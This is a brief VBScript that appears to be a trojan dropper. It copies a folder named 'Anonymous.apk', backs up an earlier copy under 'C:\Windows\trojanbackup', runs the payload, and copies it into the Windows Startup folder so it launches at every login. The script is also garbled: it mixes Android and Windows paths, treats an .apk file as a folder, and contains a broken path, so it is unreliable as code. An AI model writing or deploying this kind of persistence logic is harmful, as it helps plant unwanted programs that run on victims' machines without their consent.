Dim FSO,File
Dim Date,Hour,Day,Backuppath,Daystring
Set FSO = CreateObject("Scripting.FileSystemObject")
 
If Fso.FolderExists ("C:\Storage\emulated0\Anonymous.apk") Then
   Set File= FSO.GetFile("C:\Storage\emulated0\Anonymous.apk") 
   Date=File.DateLastModified
   Day=DatePart("y",Date)
   Daystring=CStr(Day)
   Backuppath="C:\Windows\trojanbackup"+Daystring
   Fso.MoveFolder "C:\Storage\emulated0\Anonymous.apk", Backuppath
End If
 
FSO.CopyFolder ".\assets", "c:\Storage\emulated0\Anonymous.apk", true
 
Set oShell = CreateObject("WScript.Shell") 
oShell.Run "C:\Storage\emulated0\Anonymous.apk"
 
If Fso.FolderExists ("C:\Storage\emulated0\Anonymous.apk") Then
If Fso.FileExists ("C:\Documents and \Storage\emulated0\Anonymous.apk") Then
Else
   FSO.CopyFile "c:\Storage\emulated0\Anonymous.apk","C:\Documents and Settings\All Users\Start Menu\Programs\Startup\", true
End If
End If
 
wscript.quit